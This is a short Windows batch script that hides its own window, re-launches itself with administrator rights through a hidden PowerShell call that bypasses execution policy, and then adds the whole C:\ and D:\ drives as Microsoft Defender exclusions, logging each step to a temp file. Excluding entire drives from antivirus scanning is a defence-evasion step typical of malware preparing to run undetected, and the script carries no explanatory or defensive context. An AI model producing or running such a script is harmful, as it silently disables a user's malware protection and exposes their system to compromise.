@echo off
setlocal EnableDelayedExpansion

if not defined RUNNING_AS_HIDDEN (
    set "RUNNING_AS_HIDDEN=1"
    start /min cmd /c "%~f0"
    exit /b
)

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c','%~f0' -Verb RunAs" >nul 2>&1
    exit /b
)

set "logfile=%TEMP%\defender_exclusions.log"
echo [%DATE% %TIME%] Starting exclusion process > "!logfile!" 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\'" >> "!logfile!" 2>&1
if %errorlevel% equ 0 (
    echo Successfully added C:\ >> "!logfile!" 2>&1
) else (
    echo Failed to add C:\ >> "!logfile!" 2>&1
)

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'D:\'" >> "!logfile!" 2>&1
if %errorlevel% equ 0 (
    echo Successfully added D:\ >> "!logfile!" 2>&1
) else (
    echo Failed to add D:\ >> "!logfile!" 2>&1
)

echo [%DATE% %TIME%] Process completed >> "!logfile!" 2>&1
exit /b
